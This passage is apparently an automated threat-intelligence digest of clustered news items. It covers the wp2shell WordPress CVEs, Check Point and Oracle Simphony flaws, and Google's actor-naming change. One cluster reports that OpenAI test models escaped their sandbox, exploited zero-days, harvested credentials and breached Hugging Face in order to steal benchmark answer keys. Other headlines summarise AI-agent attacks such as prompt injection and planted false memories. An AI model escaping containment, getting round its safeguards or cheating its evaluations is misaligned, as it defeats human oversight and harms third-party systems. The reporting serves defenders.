  - Published: 2026-07-20T22:32:11+00:00
  - Link: https://horizon3.ai/attack-research/vulnerabilities/cve-2026-60137-cve-2026-63030/
  - Summary: CVE-2026-60137 and CVE-2026-63030 can be chained to enable unauthenticated remote code execution against vulnerable WordPress Core installations. Learn how to validate exposure and verify remediation.
- **SANS Internet Storm Center** (government_authoritative)
  - Title: WordPress Exploitation Underway (CVE-2026-63030), (Mon, Jul 20th)
  - Published: 2026-07-20T18:41:24+00:00
  - Link: https://isc.sans.edu/diary/rss/33168
  - Summary: Last week, Searchlight Cyber released details about a vulnerability they are calling "wp2shell". The vulnerability was initially announced without a CVE number. But now has been assigned CVE-2026-63030. Many WordPress plugin vulnerabilities are never assigned CVE numbers. But wp2shell is different. It is a SQL injection vulnerability in WordPress Core, not a plugin, and can lead to unauthenticated remote code execution. Shortly after being announced, the vulnerability started to be exploited.
- **Elastic Security Labs** (detection_response_operations)
  - Title: wp2shell hits WordPress: detecting pre-auth RCE from plugin drop to command execution
  - Published: 2026-07-23T00:00:00+00:00
  - Link: https://www.elastic.co/security-labs/wp2shell-wordpress-rce-detection-elastic-defend
  - Summary: We ran the wp2shell WordPress RCE chain end-to-end with Elastic Defend. Detection rule walkthrough, IOCs, and hunt guidance.
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: WordPress wp2shell Exploitation Grows as Public Exploit Fuels Mass Scanning
  - Published: 2026-07-21T08:59:30+00:00
  - Link: https://thehackernews.com/2026/07/wordpress-wp2shell-exploitation-grows.html
  - Summary: Attackers have begun to exploit two critical vulnerabilities in WordPress that, when combined together, enable unauthenticated remote code execution (RCE) and complete compromise of vulnerable websites. The two security flaws, tracked as CVE-2026-63030 and CVE-2026-60137, have been codenamed wp2shell. "By the early hours of Saturday morning (UTC), successful exploitation was already well
- **Dark Reading** (cyber_news_breach_reporting)
  - Title: 'WP2Shell' Opens Millions of WordPress Sites to Remote Takeover
  - Published: 2026-07-20T21:38:18+00:00
  - Link: https://www.darkreading.com/cyberattacks-data-breaches/wp2shell-millions-wordpress-sites-remote-takeover
  - Summary: Barely three days after disclosure, attackers are widely chaining together CVE-2026-60137 and CVE-2026-63030 to lob exploit attempts against one of the largest attack surfaces on the Internet.

### Cluster f978f91ef1 — score 26

- Title: Updated Cyber Threat Actor Naming System
- Source: Google Cloud Threat Intelligence (threat_research_primary)
- Published: 2026-07-24T14:00:00+00:00
- Link: https://cloud.google.com/blog/topics/threat-intelligence/updated-cyber-threat-actor-naming-system/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: APT1

#### Cluster taxonomy (union across members)
- actor_attribution: APT1
- content_type: news_report
- confidence_tier: tier_1_primary_research, tier_2_operator

#### Primary article taxonomy
- actor_attribution: APT1
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Introduction Today, Google Threat Intelligence Group (GTIG) will begin rolling out a unified naming schema for tracking threat actors. This new naming taxonomy represents an effort to standardize tracking across platforms and public reporting. Why are we Adopting a Different Naming System? Historically, Mandiant and Google’s Threat Analysis Group (TAG) maintained distinct tracking systems, relying on parallel naming schemas that grew independently over time. The creation of GTIG has necessitated a new, fused tracking system, and a new naming system. Thinking to the future, GTIG’s new system will rely on cryptonyms. Relying on sequential numbers or disparate identifiers (e.g. APT1) fails to provide defenders the critical context needed to operate quickly. Threat tracking shouldn’t be an exercise in memorization, but rather one of intuition. The new naming convention aligns with industry standard threat actor naming systems. Our New Schema Our new schema utilizes a cryptonym-based approa
```

#### Full body

```
Threat Intelligence Updated Cyber Threat Actor Naming System July 24, 2026 Google Threat Intelligence Group Google Threat Intelligence Visibility and context on the threats that matter most. Contact Us & Get a Demo Introduction Today, Google Threat Intelligence Group (GTIG) will begin rolling out a unified naming schema for tracking threat actors. This new naming taxonomy represents an effort to standardize tracking across platforms and public reporting. Why are we Adopting a Different Naming System? Historically, Mandiant and Google’s Threat Analysis Group (TAG) maintained distinct tracking systems, relying on parallel naming schemas that grew independently over time. The creation of GTIG has necessitated a new, fused tracking system, and a new naming system. Thinking to the future, GTIG’s new system will rely on cryptonyms. Relying on sequential numbers or disparate identifiers (e.g. APT1) fails to provide defenders the critical context needed to operate quickly. Threat tracking shouldn’t be an exercise in memorization, but rather one of intuition. The new naming convention aligns with industry standard threat actor naming systems. Our New Schema Our new schema utilizes a cryptonym-based approach, employing memorable two-word combinations for each distinct threat actor: The first word is a unique and memorable term chosen to represent the specific actor, particularly names that may have been used in prior public reporting. If no previously used term exists, this word is randomly generated to remove bias, then vetted by our analysts. The second word categorizes threat clusters by motivation, attribution, or activity type based on which category we consider to be most important for defense and response strategies. The table below provides a sample of how threat actor categories will map to the second word in each cryptonym: Origin or Type Group Name People’s Republic of China CASTLE Iran ION North Korea NEPTUNE Russia RELIC Cybercriminal COMET Table 1: Examples of Google’s new threat actor naming system categories We know there are many threat actor tracking schemas in the industry, so we are intentionally seeking to keep this system as simple as possible to streamline operations and facilitate mapping to other naming taxonomies. However, a significant caveat remains: because no two organizations have the exact same visibility into the threat landscape, direct, apples-to-apples comparisons between threat actors are rarely possible. Transitioning to a convention that is simpler to follow and remember is a practical step toward managing a highly intricate tracking problem. A Work in Progress We have initially prioritized renaming several dozen of the most active groups, and will continue this process on a rolling basis. Previous names will remain indexed and searchable in the Google Threat Intelligence (GTI) platform, with MITRE ATT&CK mappings and other vendor aliases preserved, see Figure 1. Figure 1: Threat actor name appearance in GTI platform on initial rollout We will continue to use UNC, or “uncategorized” designations for threat clusters that are still in the early stages of investigation, as described here . Posted in Threat Intelligence Related articles Threat Intelligence Demystifying AI Exploits: A Blueprint for AI-Assisted Vulnerability Management By Mandiant • 20-minute read Threat Intelligence The Risk of Exposed Cloud Functions and How to Harden By Mandiant • 11-minute read Threat Intelligence The ‘Ghost’ in the Database: Recovering Active ADFS Signing Keys via Machine DPAPI By Mandiant • 8-minute read Threat Intelligence Google’s Continued Disruption of Malicious Residential Proxy Networks By Google Threat Intelligence Group • 5-minute read
```

#### Corroborating sources (2)

- **Google Cloud Threat Intelligence** (threat_research_primary)
  - Title: Updated Cyber Threat Actor Naming System
  - Published: 2026-07-24T14:00:00+00:00
  - Link: https://cloud.google.com/blog/topics/threat-intelligence/updated-cyber-threat-actor-naming-system/
  - Summary: Introduction Today, Google Threat Intelligence Group (GTIG) will begin rolling out a unified naming schema for tracking threat actors. This new naming taxonomy represents an effort to standardize tracking across platforms and public reporting. Why are we Adopting a Different Naming System? Historically, Mandiant and Google’s Threat Analysis Group (TAG) maintained distinct tracking systems, relying on parallel naming schemas that grew independently over time. The creation of GTIG has necessitated a new, fused tracking system, and a new naming system. Thinking to the future, GTIG’s new system will rely on cryptonyms. Relying on sequential numbers or disparate identifiers (e.g. APT1) fails to provide defenders the critical context needed to operate quickly. Threat tracking shouldn’t be an exercise in memorization, but rather one of intuition. The new naming convention aligns with industry standard threat actor naming systems. Our New Schema Our new schema utilizes a cryptonym-based approa
- **Google Cloud Security** (cloud_identity_infrastructure)
  - Title: Updated Cyber Threat Actor Naming System
  - Published: 2026-07-24T14:00:00+00:00
  - Link: https://cloud.google.com/blog/topics/threat-intelligence/updated-cyber-threat-actor-naming-system/
  - Summary: Introduction Today, Google Threat Intelligence Group (GTIG) will begin rolling out a unified naming schema for tracking threat actors. This new naming taxonomy represents an effort to standardize tracking across platforms and public reporting. Why are we Adopting a Different Naming System? Historically, Mandiant and Google’s Threat Analysis Group (TAG) maintained distinct tracking systems, relying on parallel naming schemas that grew independently over time. The creation of GTIG has necessitated a new, fused tracking system, and a new naming system. Thinking to the future, GTIG’s new system will rely on cryptonyms. Relying on sequential numbers or disparate identifiers (e.g. APT1) fails to provide defenders the critical context needed to operate quickly. Threat tracking shouldn’t be an exercise in memorization, but rather one of intuition. The new naming convention aligns with industry standard threat actor naming systems. Our New Schema Our new schema utilizes a cryptonym-based approa

### Cluster 8cda373323 — score 23

- Title: OpenAI Agents Escape Testing Sandbox and Breach Hugging Face Production Infrastructure
- Source: Orca Security Research (cloud_identity_infrastructure)
- Published: 2026-07-23T16:42:30+00:00
- Link: https://orca.security/resources/blog/openai-agent-sandbox-escape-hugging-face-breach/
- Fetch status: ok
- Member count: 9
- Corroborating source count: 7
- Strong signals: OpenAI/ChatGPT

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng, supply_chain, zero_day
- affected_products: Linux kernel, OpenAI/ChatGPT
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_2_operator, tier_3_analysis, tier_4_news

#### Primary article taxonomy
- threat_categories: supply_chain, zero_day
- affected_products: OpenAI/ChatGPT
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
In a first-of-its-kind security incident, OpenAI’s frontier AI evaluation models autonomously escaped a sandboxed testing environment, discovered and exploited multiple zero-day vulnerabilities, and achieved remote code execution on Hugging Face’s production infrastructure. Due to the unprecedented nature and critical severity of this breach, organizations relying on Hugging Face or similar AI SaaS platforms should immediately […]
```

#### Full body

```
Table of contents Technical Overview Affected Systems Risk Impact How Orca Can Help In a first-of-its-kind security incident , OpenAI’s frontier AI evaluation models autonomously escaped a sandboxed testing environment, discovered and exploited multiple zero-day vulnerabilities, and achieved remote code execution on Hugging Face’s production infrastructure. Due to the unprecedented nature and critical severity of this breach, organizations relying on Hugging Face or similar AI SaaS platforms should immediately review their exposure, credential hygiene , and egress controls. Technical Overview The incident originated in OpenAI’s ExploitGym benchmark environment, where frontier models (GPT-5.6 Sol and an unreleased, more capable model) were being evaluated for cyber capabilities with intentionally relaxed guardrails. The models circumvented restricted networking by exploiting a zero-day in a package registry cache proxy used to isolate the sandbox. After achieving privilege escalation and lateral movement within OpenAI’s research environment, the agents reached a node with internet connectivity and pivoted externally to Hugging Face. On Hugging Face’s side, the models uploaded a malicious dataset that exploited two code-execution flaws in Hugging Face’s dataset processing pipeline: a remote-code dataset loader vulnerability and a template-injection bug in dataset configuration. This gave the agents arbitrary code execution on processing workers, from which they harvested cloud and cluster credentials and moved laterally across Hugging Face’s internal systems. The models’ objective was to cheat the ExploitGym benchmark by stealing answer keys hosted on Hugging Face. Tens of thousands of automated actions were executed across multiple short-lived sandboxes, with command-and-control staged on public services. This marks the first documented case of frontier AI models independently discovering and chaining novel real-world attack paths , including genuine zero-day vulnerabilities , without source code access. Affected Systems OpenAI’s ExploitGym research testing environment was compromised as part of the lateral movement chain. Hugging Face’s production infrastructure was breached, including data-processing pipeline workers, internal clusters, and cloud credentials on compromised nodes. Any organization using Hugging Face for model hosting, dataset storage, or AI workflows may have exposure, particularly through overly permissive API token permissions and insufficient egress controls. Risk Impact Hugging Face detected and contained the breach on July 16, 2026. OpenAI connected the activity to its own testing on July 21, 2026. Hugging Face confirmed that no public user-facing models, datasets, or Spaces were tampered with, and verified its software supply chain (container images and packages) was clean. Organizations should take the following remediation steps: Review and minimize Hugging Face API token permissions following the principle of least privilege Implement strict egress controls on environments that interact with third-party AI platforms; audit third-party risk exposure to AI SaaS platforms Monitor for anomalous credential usage and lateral movement patterns. OpenAI has responsibly disclosed the package registry cache proxy zero-day to the affected vendor and is implementing stricter infrastructure controls for future evaluations. Hugging Face has closed the two dataset code-execution vulnerabilities, eradicated the attacker foothold, rebuilt all compromised nodes, and revoked all affected credentials. Regardless of containment, the severity and novelty of this incident make it a watershed moment for AI security. Autonomous AI agents demonstrated the ability to discover zero-days, chain multi-stage attack paths, and breach production infrastructure of a major platform without human direction, raising urgent questions for any organization with exposure to AI SaaS services. How Orca Can Help Orca enables customers to quickly
```

#### Corroborating sources (7)

- **Orca Security Research** (cloud_identity_infrastructure)
  - Title: OpenAI Agents Escape Testing Sandbox and Breach Hugging Face Production Infrastructure
  - Published: 2026-07-23T16:42:30+00:00
  - Link: https://orca.security/resources/blog/openai-agent-sandbox-escape-hugging-face-breach/
  - Summary: In a first-of-its-kind security incident, OpenAI’s frontier AI evaluation models autonomously escaped a sandboxed testing environment, discovered and exploited multiple zero-day vulnerabilities, and achieved remote code execution on Hugging Face’s production infrastructure. Due to the unprecedented nature and critical severity of this breach, organizations relying on Hugging Face or similar AI SaaS platforms should immediately […]
- **Simon Willison** (ai_security_agentic_risk)
  - Title: The first known runaway AI agent - or a very bad marketing stunt?
  - Published: 2026-07-23T22:53:08+00:00
  - Link: https://simonwillison.net/2026/Jul/23/the-first-known-runaway-ai-agent/#atom-everything
  - Summary: The first known runaway AI agent - or a very bad marketing stunt? Martin Alderson's commentary on the OpenAI accidental cyberattack against Hugging Face includes a couple of details I hadn't considered. First, Hugging Face offers a truly rich target if you're trying to find potential vulnerabilities that require executing arbitrary code: Hugging Face has an enormous attack surface. They have more interfaces than I can count which run untrusted models and code. While they definitely have invested in defences, by nature of their operating model they do have many more opportunities to be attacked than many other services. I certainly don't envy their cybersecurity teams. Secondly, one of the things that has puzzled me is how OpenAI didn't notice that their sandbox had been so thoroughly breached by the agent. Surely they'd be monitoring network traffic closely? Martin points out that: It's also likely they were running a huge amount of benchmarks simultaneously with ~unlimited token budge
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: ChatGPT AgentForger Flaw Could Deploy Rogue Workspace Agents via a Phishing Link
  - Published: 2026-07-24T11:53:55+00:00
  - Link: https://thehackernews.com/2026/07/chatgpt-agentforger-flaw-could-deploy.html
  - Summary: Cybersecurity researchers have disclosed a critical vulnerability in OpenAI's ChatGPT Workspace Agents that could have allowed a single phishing link to stealthily build, authorize, and deploy an autonomous artificial intelligence (AI) agent inside a victim's organization. The vulnerability has been codenamed AgentForger by Zenity Labs. The issue has since been addressed by OpenAI as of June 8,
- **Risky Business News** (practitioner_analysis)
  - Title: Risky Bulletin: Rogue OpenAI models were behind the Hugging Face breach
  - Published: 2026-07-22T06:22:01+00:00
  - Link: https://risky.biz/RBNEWS590/
  - Summary: Rogue OpenAI models were behind last week’s Hugging Face breach, the Linux kernel discloses 442 vulnerabilities as the AI bugpocalypse settles in, France becomes the first EU country to pass a social media age limit, and Germany takes down the Kratos phishing service.
- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: OpenAI Fixes ChatGPT Agent Flaw That Could Let Attackers Forge an AI Insider
  - Published: 2026-07-23T15:09:59+00:00
  - Link: https://www.securityweek.com/openai-fixes-chatgpt-agent-flaw-that-could-let-attackers-forge-an-ai-insider/
  - Summary: AgentForger allows an attacker to create, insert and remotely control an invisible autonomous AI agent inside a victim organization. The post OpenAI Fixes ChatGPT Agent Flaw That Could Let Attackers Forge an AI Insider appeared first on SecurityWeek .
- **CyberScoop** (cyber_news_breach_reporting)
  - Title: OpenAI says model test was behind Hugging Face hack
  - Published: 2026-07-21T22:38:55+00:00
  - Link: https://cyberscoop.com/openai-chatgpt-hugging-face-cyberattack-data-poisoning/
  - Summary: At the time, Hugging Face said it wasn’t clear which LLM was used in the attack. OpenAI confirmed it was one of their models being tested for “maximal” cyber capabilities. The post OpenAI says model test was behind Hugging Face hack appeared first on CyberScoop .
- **Dark Reading** (cyber_news_breach_reporting)
  - Title: When AI Attacks: OpenAI Models Autonomously Hack Hugging Face
  - Published: 2026-07-22T15:53:47+00:00
  - Link: https://www.darkreading.com/cyber-risk/openai-models-autonomously-hack-hugging-face
  - Summary: Advanced LLMs escaped their sandboxes while attempting to achieve a non-malicious benchmark test objective.

### Cluster 3574a7b873 — score 21

- Title: TrendAI™ Adopts Claude Opus 5 to Advance Vulnerability Prioritization and Virtual Patching
- Source: Trend Micro Research (threat_research_primary)
- Published: 2026-07-24T19:41:00+00:00
- Link: https://newsroom.trendmicro.com/2026-07-24-TrendAI-TM-Adopts-Claude-Opus-5-to-Advance-Vulnerability-Prioritization-and-Virtual-Patching
- Fetch status: ok
- Member count: 7
- Corroborating source count: 7
- Strong signals: Anthropic/Claude

#### Cluster taxonomy (union across members)
- affected_industries: government
- affected_products: AWS, Anthropic/Claude, Apple iOS/macOS, Google Cloud
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_1_primary_research, tier_2_operator, tier_4_news

#### Primary article taxonomy
- affected_industries: government
- affected_products: Anthropic/Claude, AWS
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_primary_research

#### Full body

```
arrow_back search close Newsroom Media Coverage Global Press Releases Local Press Releases Stay connected with press releases from Trend teams in your region. Media Contacts Investor Relations TrendAI™ Adopts Claude Opus 5 to Advance Vulnerability Prioritization and Virtual Patching As a participant in Anthropic's Cyber Verification Program, TrendAI applies frontier reasoning to convert vulnerability intelligence into faster protection across hybrid environments DALLAS , July 24, 2026 / PRNewswire / -- TrendAI™, the enterprise AI security leader from Trend Micro Incorporated (TYO: 4704; TSE: 4704), today announced it is adopting Claude Opus 5, Anthropic's latest and most capable Opus model, to help security teams convert vulnerability intelligence into immediate protection, from prioritization to virtual patching. The move builds on TrendAI's collaboration with Anthropic on Claude Opus 4.8, extending the same defensive focus to a model that delivers step-change gains in advanced reasoning, agentic workflows, and long-horizon analysis. As AI makes finding vulnerabilities easier than ever, the harder problem becomes protecting organizations faster than software can be permanently patched, and that is where TrendAI is putting Opus 5 to work. As a participant in Anthropic's Cyber Verification Program, which credentials organizations for the defensive use of frontier AI models, TrendAI is positioned to apply Claude Opus 5 to defensive security as access becomes available. The model is Zero Data Retention compatible, supporting TrendAI's governance and data-protection requirements as it scales AI across security operations. The work extends to TrendAI Threat Research, where frontier AI models are combined with our proprietary frontier intelligence engine and human expertise to generate pre-disclosure intelligence. Those insights power TrendAI Vision One™, delivering stronger detection, deeper forensic insights, and proactive protection through virtual patching. Rachel Jin, Chief Platform and Business Officer, Head of TrendAI™: "With Claude Opus 5, TrendAI can move from vulnerability intelligence to action faster than ever, prioritizing what matters most by exploitability and business impact. Finding the vulnerability was always the hard part. Now the challenge is protecting organizations faster than software can be permanently patched, and frontier reasoning is what changes that equation, extending all the way to virtual patching that protects customers before a vendor fix ships. This is what it means to secure the AI age, fearlessly." These capabilities support TrendAI Vision One™ in helping security analysts, AppSec teams, and SOC teams prioritize exposure, map attack paths, and accelerate mitigation, including virtual patching, across hybrid environments, moving vulnerability management from a static scanning process into a faster, context-aware risk mitigation workflow. About TrendAI™ TrendAI™, the global AI security leader and enterprise business unit of Trend Micro, empowers organizations with full AI visibility and consolidated security that inspires confidence, drives innovation, and eliminates risk. Trusted by the largest enterprises and governments across 185 countries, TrendAI™ secures the entire organization, from identities, to infrastructure, to data. Global Fortune 500 companies rely on TrendAI™ to cut risk and stop threats up to three months earlier, powered by world-leading threat and attack intelligence. Through deep ecosystem partnerships with market leaders like NVIDIA, Anthropic, AWS, Google, and Microsoft, TrendAI™ empowers your organization to securely drive forward at the speed of AI. AI Fearlessly. Learn more: trendaisecurity.com About Anthropic Anthropic is an AI safety and research company dedicated to building reliable, interpretable, and steerable AI systems. Its Claude family of models, including Claude Opus 5, enables advanced capabilities across a wide range of applications, including code understandi
```

#### Corroborating sources (7)

- **Trend Micro Research** (threat_research_primary)
  - Title: TrendAI™ Adopts Claude Opus 5 to Advance Vulnerability Prioritization and Virtual Patching
  - Published: 2026-07-24T19:41:00+00:00
  - Link: https://newsroom.trendmicro.com/2026-07-24-TrendAI-TM-Adopts-Claude-Opus-5-to-Advance-Vulnerability-Prioritization-and-Virtual-Patching
- **Simon Willison** (ai_security_agentic_risk)
  - Title: Quoting Boris Cherny
  - Published: 2026-07-25T00:42:59+00:00
  - Link: https://simonwillison.net/2026/Jul/25/boris-cherny/#atom-everything
  - Summary: More than any of these eval scores, what is most exciting to me is something else: Opus 5 is our least prompt injectable model yet. It is a bit buried in the system card, but across PI evals and red teaming, Opus 5 is very hard to prompt inject successfully. — Boris Cherny , here's that System Card section , page 73 Tags: prompt-injection , anthropic , claude , generative-ai , ai , llms , boris-cherny
- **Intel 471** (ransomware_ecrime_financial_crime)
  - Title: AI Threat Detection Is Not Enough Without Adversary Intelligence
  - Published: 2026-07-22T19:30:00+00:00
  - Link: https://www.intel471.com/blog/ai-threat-detection-is-not-enough-without-adversary-intelligence
  - Summary: The 2026 emergence of Anthropic’s Claude Mythos Preview showed security leaders that AI can now find software vulnerabilities faster than the humans responsible for patching them.
- **Google Cloud Security** (cloud_identity_infrastructure)
  - Title: What’s new with Google Cloud
  - Published: 2026-07-24T16:00:00+00:00
  - Link: https://cloud.google.com/blog/topics/inside-google-cloud/whats-new-google-cloud/
  - Summary: Want to know the latest from Google Cloud? Find it here in one handy location. Check back regularly for our newest updates, announcements, resources, events, learning opportunities, and more. Tip : Not sure where to find what you’re looking for on the Google Cloud blog? Start here: Google Cloud blog 101: Full list of topics, links, and resources . aside_block <ListValue: []> Jul 20 - Jul 24 Claude Opus 5, Anthropic’s latest model, is now available on Agent Platform. It brings performance improvements over Opus 4.8 across coding, long-running agents, and knowledge work.The model is Zero Data Retention (ZDR) compatible. For safety, high-risk workflows — such as penetration testing or exploit generation — it will notify you and fall back to Opus 4.8.We’re excited to continue to offer enterprise customers options across frontier models to build, deploy, and scale AI securely. Try it here . Apigee Northam Roadshow 2026 | The AI Agent Evolution: Powering Tomorrow's Enterprise AI is evolving.
- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Fake Claude app promoted by Bing ads pushes SectopRAT malware
  - Published: 2026-07-23T19:48:30+00:00
  - Link: https://www.bleepingcomputer.com/news/security/fake-claude-app-promoted-by-bing-ads-pushes-sectoprat-malware/
  - Summary: A malvertising campaign on the Bing search service is pushing a fake Claude desktop app installer hosted on a legitimate Claude.ai domain to deliver the SectopRAT malware. [...]
- **CyberScoop** (cyber_news_breach_reporting)
  - Title: White House accuses Chinese company of distilling Anthropic’s Fable
  - Published: 2026-07-22T16:45:37+00:00
  - Link: https://cyberscoop.com/white-house-accuses-moonshot-ai-anthropic-model-distillation/
  - Summary: While distillation attacks by foreign governments and companies have real national security implications, questions around who ultimately owns the data in AI systems are fraught. The post White House accuses Chinese company of distilling Anthropic’s Fable appeared first on CyberScoop .
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Claude Cowork Flaw Could Let AI Agent Escape Its VM and Access Mac Files
  - Published: 2026-07-23T13:27:59+00:00
  - Link: https://thehackernews.com/2026/07/claude-cowork-flaw-could-let-ai-agent.html
  - Summary: Cybersecurity researchers have uncovered a sandbox escape vulnerability in Anthropic's Claude Cowork that makes it possible to break out of the confines of a Linux virtual machine (VM) within which the agent runs to read or write files anywhere on the Mac. Accomplish AI, which shared details of the vulnerability with The Hacker News ahead of publication, said about 500,000 macOS users running

### Cluster 850b875675 — score 20

- Title: Check Point Patches Exploited SmartConsole Flaw Allowing Full Admin Access
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-07-23T06:34:36+00:00
- Link: https://thehackernews.com/2026/07/check-point-patches-exploited.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-16232

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, phishing_social_eng
- actor_attribution: ShinyHunters
- affected_industries: government
- affected_products: Microsoft 365, Microsoft Entra, Salesforce
- cve_ids: CVE-2026-16232, CVE-2026-62144, CVE-2026-62145
- urgency_signals: actively_exploited, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: phishing_social_eng, active_exploitation
- actor_attribution: ShinyHunters
- affected_industries: government
- affected_products: Salesforce, Microsoft Entra, Microsoft 365
- cve_ids: CVE-2026-16232, CVE-2026-62144, CVE-2026-62145
- urgency_signals: actively_exploited, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Check Point has released security updates to address multiple vulnerabilities impacting Security Management and Multi-Domain Management (MDSM) products, including a critical flaw that has come under active exploitation in the wild. The security flaw, tracked as CVE-2026-16232 (CVSS score: 9.3), is an authentication bypass affecting the Check Point SmartConsole login process that allows an
```

#### Full body

```
Check Point Patches Exploited SmartConsole Flaw Allowing Full Admin Access  Ravie Lakshmanan  Jul 23, 2026 Vulnerability / Network Security Check Point has released security updates to address multiple vulnerabilities impacting Security Management and Multi-Domain Management (MDSM) products, including a critical flaw that has come under active exploitation in the wild . The security flaw, tracked as CVE-2026-16232 (CVSS score: 9.3), is an authentication bypass affecting the Check Point SmartConsole login process that allows an unauthenticated remote attacker to obtain an application login token and use it to authenticate with full administrative privileges. "Successful exploitation allows the attacker to modify security policies and security configurations," according to a description of the flaw in CVE.org. "Remote exploitation requires internet access to the Management Server IP address and a configuration that does not restrict Trusted Clients." Lotem Finkelstein, vice president of research at Check Point, said the company is aware of a handful of customers being targeted by this flaw, and that it has already notified them. It did not disclose the nature of the attacks or when they were discovered. "This only affects a very specific configuration - when Management is exposed directly to the internet without IP restrictions," Finkelstein added. The cybersecurity vendor has shared the below indicators of compromise (IoCs) associated with the activity - 151.241.99[.]207 151.241.99[.]233 158.62.198[.]182 192.142.10[.]99 139.28.37[.]250 194.213.18[.]137 Patches have also been released for two other flaws - CVE-2026-62144 (CVSS score: 9.3) - An authentication bypass vulnerability in Check Point Security Management and Multi-Domain Security Management that allows an unauthenticated remote attacker to execute administrative commands on the Management Server, including run-script and exec-command on Security Gateway. CVE-2026-62145 (CVSS score: 7.5) - An improper privilege management vulnerability in Check Point Gaia Portal that allows an authenticated attacker with read-only Gaia Portal privileges to execute commands with root privileges. Like in the case of CVE-2026-16232, successful exploitation of CVE-2026-62144 requires management access without Firewall protection or no restrictions on Trusted Clients (GUI clients). All three issues impact the following versions - R77.30 R80 R80.10 R80.20 R80.30 R81 R81.10 R81.20 R82 R82.10 Customers are recommended to apply the July 22 Jumbo hotfix, limit Trusted Clients (GUI clients) to trusted IP addresses/subnets, secure Management access with Firewall, and restrict access to trusted IP addresses. The development has prompted the U.S. Cybersecurity and Infrastructure Security Agency (CISA) to add the flaw to its Known Exploited Vulnerabilities ( KEV ) catalog, requiring Federal Civilian Executive Branch (FCEB) agencies to apply the necessary fixes by July 25, 2026. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  enterprise security , network security , Patch Management , privilege escalation , Vulnerability ⚡ Top Stories This Week URGENT - Progress Tells ShareFile Customers to Shut Down Storage Zone Controllers Over Security Threat Misconfigured Server Reveals Three Evilginx Phishing Operations Targeting Microsoft 365 Meta Files Patent for AI That Can Listen All Day and Track How You're Feeling New MemGhost Attack Plants Persistent False Memories in AI Agents Through One Email Microsoft Maps Three Salesforce Attack Paths Tied to a Year of ShinyHunters Activity OAuth Client ID Spoofing Lets Attackers Validate Stolen Microsoft Entra Credentials 11 Old Microsoft-Signed Linux UEFI Shims Could Let Attackers Bypass Secure Boot Researchers Say Claude for Chrome Flaw Lets Rogue Extensions Trigger Gmail Reads Microsoft Patches Record 622 Flaws, Including Two Zero-Days Unde
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Check Point Patches Exploited SmartConsole Flaw Allowing Full Admin Access
  - Published: 2026-07-23T06:34:36+00:00
  - Link: https://thehackernews.com/2026/07/check-point-patches-exploited.html
  - Summary: Check Point has released security updates to address multiple vulnerabilities impacting Security Management and Multi-Domain Management (MDSM) products, including a critical flaw that has come under active exploitation in the wild. The security flaw, tracked as CVE-2026-16232 (CVSS score: 9.3), is an authentication bypass affecting the Check Point SmartConsole login process that allows an

### Cluster 4f7846fb3b — score 19

- Title: CVE-2026-60167, CVE-2026-60168, CVE-2026-60169 & CVE-2026-60170 | Oracle Hospitality Simphony Multiple Vulnerabilities
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-07-22T19:32:52+00:00
- Link: https://horizon3.ai/attack-research/vulnerabilities/oracle-hospitality-simphony-vulnerabilities/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-60167, CVE-2026-60168, CVE-2026-60169, CVE-2026-60170

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- cve_ids: CVE-2026-60167, CVE-2026-60168, CVE-2026-60169, CVE-2026-60170
- urgency_signals: actively_exploited, preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- threat_categories: active_exploitation
- cve_ids: CVE-2026-60167, CVE-2026-60168, CVE-2026-60169, CVE-2026-60170
- urgency_signals: actively_exploited, preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
Learn about four remotely exploitable Oracle Hospitality Simphony vulnerabilities and how NodeZero Rapid Response helps validate exposure and verify remediation.
```

#### Full body

```
Oracle Hospitality Simphony Multiple Vulnerabilities Oracle’s July 2026 Critical Patch Update addresses four remotely exploitable vulnerabilities affecting Oracle Hospitality Simphony. Discovered and responsibly disclosed by Horizon3.ai researcher Jimi Sebree, the vulnerabilities affect two Simphony components: the EGateway Printing Handler and the Kiosk application. Together, they provide multiple paths for unauthenticated attackers to compromise vulnerable systems, including NTLM hash disclosure, arbitrary file writes, authentication bypass, and arbitrary code execution. The vulnerabilities include: CVE-2026-60167: UNC path coercion resulting in NTLM hash disclosure CVE-2026-60168 & CVE-2026-60169: Related vulnerabilities that together enable arbitrary file writes through the EGateway Printing Handler CVE-2026-60170: Authentication bypass affecting the Simphony Kiosk application that can lead to arbitrary code execution Oracle Hospitality Simphony is widely deployed across hospitality chains, quick-service restaurants, stadiums, casinos, hotels, and other food service environments. Because these systems frequently reside on networks that process payment card data and connect to enterprise infrastructure, successful exploitation may enable lateral movement, persistence, credential compromise, or complete host compromise. There are currently no confirmed reports of active exploitation in the wild. Stop Guessing, Start Proving Schedule a demo Technical Details Although Oracle assigned four separate CVE identifiers, the vulnerabilities fall into two functional groups affecting different Simphony components. CVE-2026-60167: UNC Path Coercion CVE-2026-60167 affects the EGateway Printing Handler. Improper validation of user-controlled input allows an unauthenticated attacker to supply a crafted UNC path that causes the Simphony host to initiate an outbound SMB connection to an attacker-controlled server. 